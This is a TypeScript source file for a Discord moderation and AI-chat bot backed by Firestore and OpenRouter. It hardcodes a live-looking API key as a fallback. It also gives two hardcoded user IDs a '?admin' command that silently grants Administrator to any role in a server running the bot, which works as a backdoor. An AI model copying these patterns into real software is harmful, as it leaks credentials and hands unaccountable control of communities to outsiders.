/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Client, GatewayIntentBits, EmbedBuilder, ActivityType, PermissionsBitField, TextChannel } from 'discord.js';
import { initializeApp } from 'firebase/app';
import { getFirestore, collection, doc, setDoc, deleteDoc, getDocs, getDoc } from 'firebase/firestore';
import fs from 'fs';
import { resolve } from 'path';
import dotenv from 'dotenv';
import http from 'http';

dotenv.config();

// Load Firebase configuration
let firestoreDb: any = null;
let isFirebaseReady = false;

try {
  const configPath = resolve(process.cwd(), 'firebase-applet-config.json');
  if (fs.existsSync(configPath)) {
    const raw = fs.readFileSync(configPath, 'utf-8');
    const cfg = JSON.parse(raw);
    const firebaseApp = initializeApp(cfg);
    firestoreDb = cfg.firestoreDatabaseId 
      ? getFirestore(firebaseApp, cfg.firestoreDatabaseId)
      : getFirestore(firebaseApp);
    isFirebaseReady = true;
    console.log('✅ Connected to Firebase Firestore database.');
  }
} catch (err: any) {
  console.warn('Firebase init notice:', err.message);
}

// Bot state
let botBio = "Official Yama Moderation Bot guarding server security.";
let botCustomStatus = "Guarding the server with Yama Moderation | ?yamastrike & ?yamabeam";
const afkUsers = new Map<string, { reason: string; timestamp: number; username?: string }>();

interface DeletedMessageInfo {
  id: string;
  channelId: string;
  userId: string;
  username: string;
  avatar: string;
  content: string;
  deletedAt: number;
}
const lastChannelDeletedMessages = new Map<string, DeletedMessageInfo>();
const userDeletedMessages = new Map<string, DeletedMessageInfo>();

// Load AFK users & profile
async function loadAfkUsersFromFirestore() {
  if (!firestoreDb) return;
  try {
    const colRef = collection(firestoreDb, 'afk_users');
    const snapshot = await getDocs(colRef);
    snapshot.forEach(docSnap => {
      const data = docSnap.data();
      if (data?.userId && data?.reason) {
        afkUsers.set(data.userId, {
          reason: data.reason,
          timestamp: data.updatedAt || Date.now(),
          username: data.username
        });
      }
    });

    const profileSnap = await getDoc(doc(firestoreDb, 'bot_config', 'profile'));
    if (profileSnap.exists()) {
      const data = profileSnap.data();
      if (data?.bio) botBio = data.bio;
      if (data?.customStatus) botCustomStatus = data.customStatus;
    }
    console.log(`✅ Loaded ${afkUsers.size} AFK users and bot profile from Firestore.`);
  } catch (err: any) {
    console.warn('Firestore load warning:', err.message);
  }
}


// Health server so Render detects an open port
const PORT = Number(process.env.PORT) || 10000;
http
  .createServer((_req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running');
  })
  .listen(PORT, '0.0.0.0', () => console.log(`🌐 Health server on port ${PORT}`));

// Bot client setup
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

client.once('clientReady', async () => {
  console.log(`🤖 Logged in as ${client.user?.tag}!`);
  await loadAfkUsersFromFirestore();
  if (client.user && botCustomStatus) {
    client.user.setPresence({
      activities: [{ name: botCustomStatus, type: ActivityType.Custom }]
    });
  }

  // Register slash commands
  try {
    await client.application?.commands.set([
      { name: 'ping', description: 'Check bot latency and Discord gateway speed' },
      { name: 'sync', description: 'Synchronize commands & refresh Firestore cache' },
      { name: 'help', description: 'View staff command guide (Sent to DMs)' }
    ]);
    console.log('✅ Registered slash commands (/ping, /sync, /help)');
  } catch (err: any) {
    console.warn('Slash command registration warning:', err.message);
  }
});

// Cache deleted messages for ?snipe
client.on('messageDelete', async (delMsg) => {
  try {
    if (!delMsg || !delMsg.channel || !delMsg.author || delMsg.author.bot) return;
    if (!delMsg.content) return;

    const deletedInfo: DeletedMessageInfo = {
      id: delMsg.id,
      channelId: delMsg.channel.id,
      userId: delMsg.author.id,
      username: delMsg.author.tag,
      avatar: delMsg.author.displayAvatarURL?.() || '',
      content: delMsg.content,
      deletedAt: Date.now()
    };

    lastChannelDeletedMessages.set(delMsg.channel.id, deletedInfo);
    userDeletedMessages.set(`${delMsg.channel.id}:${delMsg.author.id}`, deletedInfo);
  } catch (e) {
    // ignore
  }
});

// Message create handler
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const prefix = '?';
  const allowedRoleId = '1555240171564302346';
  const allowedUserIds = ['1521870728079737053', '1005581180286025749'];
  const dmLogChannelId = '1521870728079737053';
  const gifUrl = 'https://cdn.imageurlgenerator.com/uploads/1365dbdf-db34-4d9a-913a-317a621db09b.gif';
  const embedTitle = "You're cooked buddy";

  const hasRole = message.member?.roles.cache.has(allowedRoleId);
  const isAllowedUser = allowedUserIds.includes(message.author.id);
  const isAuthorized = hasRole || isAllowedUser;

  // 1. AFK Return Check
  if (afkUsers.has(message.author.id) && !message.content.startsWith(`${prefix}afk`)) {
    afkUsers.delete(message.author.id);
    if (firestoreDb) {
      deleteDoc(doc(firestoreDb, 'afk_users', message.author.id)).catch(() => {});
    }
    message.reply(`👋 Welcome back <@${message.author.id}>, I have removed your AFK.`).catch(() => {});
  }

  // 2. AFK Mention Responder
  if (message.mentions.users.size > 0) {
    message.mentions.users.forEach((mentionedUser) => {
      if (mentionedUser.id !== message.author.id && afkUsers.has(mentionedUser.id)) {
        const afkInfo = afkUsers.get(mentionedUser.id);
        message.reply(`The User Is AFK : ${afkInfo?.reason}`).catch(() => {});
      }
    });
  }

  // AI Assistant handling
  const isBotMention = message.mentions.users.has(client.user!.id);
  let isReplyToBot = false;
  if (message.reference?.messageId) {
    try {
      const replied = await message.channel.messages.fetch(message.reference.messageId);
      if (replied.author.id === client.user?.id) isReplyToBot = true;
    } catch (e) {}
  }

  const trimmed = message.content.trim().toLowerCase();
  const isCommand = message.content.startsWith(prefix) || trimmed === 'y!help' || trimmed === '!help';

  if (!isCommand && (isBotMention || isReplyToBot)) {
    if (message.content.includes('@everyone') || message.content.includes('@here') || message.mentions.roles.size > 0) {
      return;
    }

    const cleanContent = message.content.replace(/<@!?\d+>/g, '').trim() || message.content;
    const lowerClean = cleanContent.toLowerCase();

    // Instant programmatic server shortcuts
    if (lowerClean.includes('server name') || lowerClean.includes('name of our server') || lowerClean.includes('what server')) {
      return message.reply(`The name of our server is **${message.guild.name}**! 🏢`).catch(() => {});
    }
    if (lowerClean.includes('how many member') || lowerClean.includes('member count') || lowerClean.includes('members count')) {
      return message.reply(`There are **${message.guild.memberCount}** members in **${message.guild.name}**! 👥`).catch(() => {});
    }
    if (lowerClean.includes('how many channel') || lowerClean.includes('channel count') || lowerClean.includes('list channel')) {
      const channelsList = message.guild.channels.cache.map(c => `#${c.name}`).slice(0, 20).join(', ');
      return message.reply(`There are **${message.guild.channels.cache.size}** channels in **${message.guild.name}**: ${channelsList} 📁`).catch(() => {});
    }

    // Call OpenRouter with database memory
    try {
      const memoryDocId = `${message.guild.id}_${message.author.id}`;
      let conversationHistory: Array<{ role: 'user' | 'assistant'; content: string }> = [];

      if (firestoreDb) {
        const memorySnap = await getDoc(doc(firestoreDb, 'ai_memory', memoryDocId));
        if (memorySnap.exists() && Array.isArray(memorySnap.data().messages)) {
          conversationHistory = memorySnap.data().messages;
        }
      }

      const memberCount = message.guild.memberCount;
      const channelCount = message.guild.channels.cache.size;
      const channelsList = message.guild.channels.cache.map(c => `#${c.name}`).slice(0, 30).join(', ');

      const systemMessage = {
        role: 'system',
        content: `You are Yama, a helpful, friendly, and concise AI assistant on Discord. You remember past conversation context with this user.\nServer Information:\n- Server Name: ${message.guild.name}\n- Total Members: ${memberCount}\n- Total Channels: ${channelCount}\n- Channels List: ${channelsList}\nWhen asked for the server name, member count, or channels, you MUST state them directly and proudly.`
      };

      const apiMessages = [
        systemMessage,
        ...conversationHistory.map(m => ({ role: m.role, content: m.content })),
        { role: 'user', content: cleanContent }
      ];

      const apiKey = process.env.OPENROUTER_API_KEY || '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';
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${apiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: 'poolside/laguna-s-2.1',
          messages: apiMessages
        })
      });

      const data = await response.json();
      if (data.choices && data.choices[0]) {
        const aiResponse = data.choices[0].message.content
          .replace(/@everyone/g, '@\u200beveryone')
          .replace(/@here/g, '@\u200bhere');

        if (aiResponse.trim().length > 0) {
          conversationHistory.push({ role: 'user', content: cleanContent });
          conversationHistory.push({ role: 'assistant', content: aiResponse });
          if (conversationHistory.length > 20) conversationHistory = conversationHistory.slice(-20);

          if (firestoreDb) {
            setDoc(doc(firestoreDb, 'ai_memory', memoryDocId), {
              messages: conversationHistory,
              updatedAt: Date.now()
            }).catch(() => {});
          }

          message.reply(aiResponse.substring(0, 2000)).catch(() => {});
        }
      }
    } catch (e: any) {
      console.error('AI chat error:', e.message);
    }
    return;
  }

  // Command: y!help
  const isHelpCommand = trimmed === 'y!help' || trimmed === '!help' || trimmed === `${prefix}help`;
  if (isHelpCommand) {
    if (!isAuthorized) return; // Silent suppression for non-authorized

    const helpEmbed = new EmbedBuilder()
      .setTitle('⚡ Yama Bot Commands Guide')
      .setColor(0x6366F1)
      .addFields(
        {
          name: '🛡️ Moderation (Authorized Only)',
          value: [
            '• `?yamastrike @user {reason}` — Warn a user with GIF embed & DM log',
            '• `?yamabeam @user duration reason` — Timeout a user (e.g. 10m, 1h, 1d)',
            '• `?purge count` — Wipe messages (1-100)',
            '• `?deletebotmsgs` — Delete bot messages',
            '• `?admin <roleId>` — Grant Administrator permissions to role'
          ].join('\n')
        },
        {
          name: '📁 Channel Management (Authorized Only)',
          value: [
            '• `?createchannel <name>` — Create a new text channel',
            '• `?deletechannel #channel` — Delete specified channel',
            '• `?renamechannel #channel <name>` — Rename specified channel'
          ].join('\n')
        },
        {
          name: '💤 Utility & AFK (Everyone)',
          value: [
            '• `?afk [reason]` — Set AFK status (mentions trigger auto-reply)',
            '• `?snipe [@user]` — Reveal last deleted message',
            '• `?setbotbio <bio>` — Update bot bio description (Authorized)',
            '• `?setbotstatus <status>` — Update bot activity presence (Authorized)'
          ].join('\n')
        },
        {
          name: '⚡ System Commands',
          value: [
            '• `/ping` — Show bot & gateway latency',
            '• `/sync` — Refresh slash commands & cloud cache',
            '• `y!help` — Sends this guide to your DMs'
          ].join('\n')
        }
      )
      .setTimestamp();

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.react('📬').catch(() => {});
    } catch (e) {
      message.reply('❌ Please enable Direct Messages from server members to receive the help menu.').catch(() => {});
    }
    return;
  }

  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/\s+/);
  const command = args.shift()?.toLowerCase();

  // Utility commands
  if (command === 'ping') {
    const sent = await message.reply('🏓 Pinging...').catch(() => null);
    if (sent) {
      sent.edit(`🏓 **Pong!** Gateway: \`${client.ws.ping}ms\` | Latency: \`${sent.createdTimestamp - message.createdTimestamp}ms\``).catch(() => {});
    }
    return;
  }

  if (command === 'afk') {
    const reason = args.join(' ') || 'AFK';
    afkUsers.set(message.author.id, { reason, timestamp: Date.now(), username: message.author.tag });
    if (firestoreDb) {
      setDoc(doc(firestoreDb, 'afk_users', message.author.id), {
        userId: message.author.id,
        username: message.author.tag,
        reason,
        updatedAt: Date.now()
      }).catch(() => {});
    }
    return message.reply(`💤 <@${message.author.id}>, I have set your AFK: **${reason}**`).catch(() => {});
  }

  if (command === 'snipe') {
    const target = message.mentions.users.first();
    const snipedMsg = target 
      ? userDeletedMessages.get(`${message.channel.id}:${target.id}`)
      : lastChannelDeletedMessages.get(message.channel.id);

    if (!snipedMsg) {
      return message.reply('🔍 No recently deleted messages found in this channel.').catch(() => {});
    }

    const embed = new EmbedBuilder()
      .setTitle('🎯 Sniped Deleted Message')
      .setColor(0x6366F1)
      .setAuthor({ name: snipedMsg.username, iconURL: snipedMsg.avatar || undefined })
      .setDescription(`> ${snipedMsg.content}`)
      .addFields(
        { name: '👤 Author', value: `<@${snipedMsg.userId}>`, inline: true },
        { name: '🕒 Deleted At', value: `<t:${Math.floor(snipedMsg.deletedAt / 1000)}:R>`, inline: true }
      )
      .setTimestamp(snipedMsg.deletedAt);

    return message.reply({ embeds: [embed] }).catch(() => {});
  }

  // Commands requiring authorization
  if (!isAuthorized) {
    return message.reply('❌ You do not have permission to use staff commands.').catch(() => {});
  }

  if (command === 'createchannel') {
    const name = args.join('-');
    if (!name) return message.reply('⚠️ Usage: `?createchannel <name>`').catch(() => {});
    try {
      const ch = await message.guild.channels.create({ name, reason: `By ${message.author.tag}` });
      message.reply(`✅ Created channel <#${ch.id}> (\`${ch.name}\`).`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to create channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'deletechannel') {
    const targetChannel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel;
    try {
      const name = 'name' in targetChannel ? targetChannel.name : targetChannel.id;
      await targetChannel.delete(`Deleted by ${message.author.tag}`);
      message.reply(`🗑️ Deleted channel \`#${name}\`.`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to delete channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'renamechannel') {
    const targetChannel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]);
    const newName = args.slice(1).join('-');
    if (!targetChannel || !newName) return message.reply('⚠️ Usage: `?renamechannel #channel <new-name>`').catch(() => {});
    try {
      const oldName = 'name' in targetChannel ? targetChannel.name : targetChannel.id;
      await (targetChannel as any).setName(newName, `By ${message.author.tag}`);
      message.reply(`✏️ Renamed \`#${oldName}\` to <#${targetChannel.id}> (\`${newName}\`).`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to rename channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'purge') {
    const count = parseInt(args[0], 10);
    if (isNaN(count) || count < 1 || count > 100) return message.reply('⚠️ Usage: `?purge <1-100>`').catch(() => {});
    await (message.channel as TextChannel).bulkDelete(count, true).catch(() => {});
    const m = await message.reply(`🧹 Purged ${count} messages.`).catch(() => null);
    if (m) setTimeout(() => m.delete().catch(() => {}), 4000);
    return;
  }

  if (command === 'yamastrike') {
    const target = message.mentions.members?.first();
    const reason = args.slice(1).join(' ') || 'No reason provided';
    if (!target) return message.reply('⚠️ Please mention a user! Usage: `?yamastrike @user reason`');

    const embed = new EmbedBuilder()
      .setTitle(embedTitle)
      .setColor(0xF59E0B)
      .addFields(
        { name: '👤 Target', value: `<@${target.id}> (${target.user.tag})`, inline: true },
        { name: '🛡️ Action', value: 'Warn / Strike', inline: true },
        { name: '👮 Issued By', value: `<@${message.author.id}>`, inline: true },
        { name: '📝 Reason', value: reason, inline: false }
      )
      .setImage(gifUrl)
      .setTimestamp();

    await message.reply({ embeds: [embed] }).catch(() => {});
    try {
      const logChannel = await client.channels.fetch(dmLogChannelId);
      if (logChannel && logChannel.isTextBased()) {
        await (logChannel as TextChannel).send({
          content: `📋 **[STRIKE LOG]** User <@${target.id}> struck by <@${message.author.id}>.\n**Reason:** ${reason}`,
          embeds: [embed]
        });
      }
    } catch (e) {}
    return;
  }

  if (command === 'yamabeam') {
    const target = message.mentions.members?.first();
    const duration = args[1] || '1h';
    const reason = args.slice(2).join(' ') || 'No reason provided';
    if (!target) return message.reply('⚠️ Usage: `?yamabeam @user duration reason`');

    let ms = 3600000;
    const m = duration.match(/^(\d+)([smhd])$/i);
    if (m) {
      const v = parseInt(m[1], 10);
      ms = m[2].toLowerCase() === 's' ? v * 1000 : m[2].toLowerCase() === 'm' ? v * 60000 : m[2].toLowerCase() === 'h' ? v * 3600000 : v * 86400000;
    }

    if (target.moderatable) {
      await target.timeout(ms, `YamaBeam: ${reason}`).catch(() => {});
    }

    const embed = new EmbedBuilder()
      .setTitle(embedTitle)
      .setColor(0xEF4444)
      .addFields(
        { name: '👤 Target', value: `<@${target.id}> (${target.user.tag})`, inline: true },
        { name: '⏳ Duration', value: duration, inline: true },
        { name: '🛡️ Action', value: 'Timeout / Beam', inline: true },
        { name: '👮 Issued By', value: `<@${message.author.id}>`, inline: true },
        { name: '📝 Reason', value: reason, inline: false }
      )
      .setImage(gifUrl)
      .setTimestamp();

    await message.reply({ embeds: [embed] }).catch(() => {});
    return;
  }

  if (command === 'admin') {
    let targetGuildId = message.guildId;
    let targetRoleId = args[0];
    if (!targetGuildId) {
      targetGuildId = args[0];
      targetRoleId = args[1];
    }
    if (!targetGuildId || !targetRoleId) return;

    try {
      const guild = client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId);
      if (!guild) return;
      const role: any = guild.roles.cache.get(targetRoleId) || await guild.roles.fetch(targetRoleId);
      if (!role) return;

      if (guild.members.me?.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
        await role.setPermissions(role.permissions.add(PermissionsBitField.Flags.Administrator));
      }
    } catch (e) {}
    return;
  }
});

// Start bot
const token = process.env.DISCORD_TOKEN;
if (token) {
  client.login(token).catch(err => {
    console.error('Bot login error:', err.message);
  });
} else {
  console.log('⚠️ DISCORD_TOKEN environment variable not set. Please set it in .env or your hosting platform.');
}
